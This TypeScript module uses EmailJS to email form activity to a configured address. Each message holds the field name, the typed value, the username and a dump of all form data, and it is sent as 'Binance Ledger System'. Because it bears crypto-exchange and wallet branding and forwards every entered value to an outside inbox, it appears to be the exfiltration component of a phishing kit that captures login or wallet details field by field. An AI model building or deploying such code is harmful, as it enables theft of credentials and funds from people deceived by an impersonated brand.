
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '@/config/emailjs.config';

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
}

export const sendEmailNotification = async (data: EmailData) => {
  try {
    const templateParams = {
      to_email: EMAILJS_CONFIG.TO_EMAIL,
      from_name: "Binance Ledger System",
      subject: `🔒 ${data.step} - Form Activity Alert`,
      message: `Step: ${data.step}
${data.field ? `Field: ${data.field}` : ''}
${data.value ? `Value: ${data.value}` : ''}
${data.username ? `Username: ${data.username}` : ''}
Timestamp: ${data.timestamp}

${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
      step: data.step,
      field: data.field || '',
      value: data.value || '',
      username: data.username || '',
      timestamp: data.timestamp,
      allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
    };

    console.log('Sending email with template params:', templateParams);

    const result = await emailjs.send(
      EMAILJS_CONFIG.SERVICE_ID,
      EMAILJS_CONFIG.TEMPLATE_ID,
      templateParams,
      EMAILJS_CONFIG.USER_ID
    );

    console.log('Email sent successfully:', result);
    return result;
  } catch (error) {
    console.error('Failed to send email:', error);
    throw error;
  }
};
